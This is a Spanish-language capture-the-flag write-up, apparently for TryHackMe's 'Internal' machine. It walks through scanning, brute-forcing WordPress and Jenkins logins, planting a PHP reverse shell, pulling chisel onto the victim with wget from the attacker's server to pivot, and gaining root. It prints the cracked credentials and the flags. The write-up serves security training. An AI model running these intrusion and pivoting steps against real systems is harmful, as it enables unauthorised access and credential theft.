@@ -1,0 +1,150 @@
+Internal
+Tryhackme
+
+Proceso de resolución de la máquina "internal" en la plataforma Tryhackme.
+
+Escaneo nmap:
+
+nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn -oN escaneointernal 10.10.137.226
+
+Resultado:
+
+- Puerto 22/tcp abierto: SSH (syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 - Ubuntu Linux; protocol 2.0).
+- Puerto 80/tcp abierto: HTTP (syn-ack ttl 64 Apache httpd 2.4.29 - Ubuntu).
+
+La presencia del puerto 80 indica que hay un servidor web en funcionamiento. La IP de la víctima en el servidor web utiliza virtual hosting. Para acceder a ella, modificamos nuestro archivo /etc/hosts para que la IP esté relacionada con un host de Tryhackme:
+
+nano /etc/hosts
+
+10.10.131.54   internal.thm
+
+Con esto, logramos acceder a la página.
+
+Fuzzing con Gobuster:
+
+gobuster dir -u http://10.10.131.54/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+
+Resultado:
+
+- /blog
+- /wordpress
+- /javascript
+- /phpmyadmin
+
+Luego, ejecutamos Gobuster en el directorio /blog:
+
+gobuster dir -u http://10.10.131.54/blog -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+
+Resultado:
+
+- /blog/wp-content
+- /blog/wp-includes
+- /blog/wp-admin
+
+Dado que se identifica como un sitio web de WordPress, continuamos con el análisis utilizando WPscan.
+
+WP-scan:
+
+Buscar usuarios:
+
+wpscan --url http://internal.thm/blog --enumerate u
+
+Resultado:
+
+- admin
+
+Buscar plugins:
+
+wpscan --url http://internal.thm/blog --enumerate p
+
+Resultado:
+
+- No se encontraron plugins.
+
+Fuerza bruta en el usuario "user":
+
+wpscan --url http://internal.thm/blog/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin
+
+Respuesta: my2boys
+
+Después de ingresar al panel de WordPress, colocamos una reverse shell en PHP (Pentestmonkey) y enviamos comandos a través del puerto 443. Cuando estamos dentro a través del puerto 443, ajustamos la TTY:
+
+script /dev/null -c bash
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+
+Buscando por carpetas llegamos a /opt y encontramos "user.txt".
+
+En user.txt encontramos el usuario "aubreanna":
+
+aubreanna:bubb13guM!@#123
+
+Con el usuario "aubreanna" tenemos más privilegios y encontramos /home/aubreanna/user.txt:
+
+THM{int3rna1_fl4g_1}
+
+También encontramos /home/aubreanna/jenkins.txt:
+
+Internal Jenkins service is running on 172.17.0.2:8080
+
+Encontramos un Jenkins en la IP 172.17.0.2:8080, pero al colocarlo en el navegador nos responde un 404. Requerimos hacer un pivoting a esa IP.
+
+Para ese proceso, necesitamos la herramienta "chisel", que es una herramienta para pivoting manual. Puedes encontrarlo en https://github.com/jpillora/chisel.
+
+Luego de instalar chisel y darle permisos (chmod +x chisel), debemos subirlo al servidor víctima.
+
+Primero, creamos un servidor con Python3:
+
+python3 -m http.server 80
+
+Luego, en la máquina víctima, ingresamos a la carpeta /tmp, donde tenemos permisos de escritura, y desde allí traemos chisel que está en nuestro servidor Python:
+
+aubreanna@internal:/tmp$ wget 10.18.112.21/chisel
+chmod +x chisel
+
+El siguiente paso es hacer funcionar chisel en nuestro equipo como un servidor:
+
+./chisel server --reverse -p 1234
+
+Para finalizar, configuramos el chisel de la máquina víctima como cliente:
+
+./chisel client (mi-ip):1234 R:5000:127.0.0.1:8080
+
+La parte "R:5000:127.0.0.1:8080" de la instrucción es el comando remoto que se ejecutará en el servidor Chisel una vez que la conexión se haya establecido. Se descompone de la siguiente manera:
+
+- R: Indica que se debe ejecutar un reenvío de puertos remoto en el servidor Chisel. Esto significa que el tráfico que llegue al servidor Chisel será redirigido hacia otro destino.
+- 5000: Es el puerto en el servidor Chisel donde se escucharán las conexiones entrantes.
+- 127.0.0.1:8080: Es el destino al que se redirigirá el tráfico que llegue al puerto 5000 en el servidor Chisel. En este caso, el tráfico se redirigirá a la dirección IP 127.0.0.1 (la máquina local) en el puerto 8080.
+
+Con este bypass, logramos entrar en una consola de login de Jenkins:
+
+172.17.0.2:5000
+
+Aquí realizamos fuerza bruta en el usuario "admin" utilizando Hydra:
+
+hydra -l admin -P rockyou.txt 127.0.0.1 -s 5000 -f http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+
+Respuesta: usr: admin | pass: spongebob
+
+Al ingresar en Jenkins, encontramos una consola de comandos en la que se puede ingresar código Java:
+
+https://it-tfuerst.de/2022/06/26/abusing-jenkins-groovy-script-console-to-get-shell/
+
+Copiamos y pegamos el código malicioso en Jenkins, cambiando el puerto y la IP correspondiente. Ejecutamos y luego interceptamos con netcat:
+
+nc -nlvp 444
+
+Ahora enviamos comandos directamente al servidor donde está alojado Jenkins. Buscando, encontramos un usuario y contraseña de root:
+
+root:tr0ub13guM!@#123
+
+Como no podemos utilizarlo, probamos en el puerto SSH de la máquina víctima:
+
+ssh @root(IP-victima)
+password: tr0ub13guM!@#123
+
+Ingresamos como root. Buscando entre los archivos, encontramos la última flag faltante (:D):
+
+THM{d0ck3r_d3str0y3r}
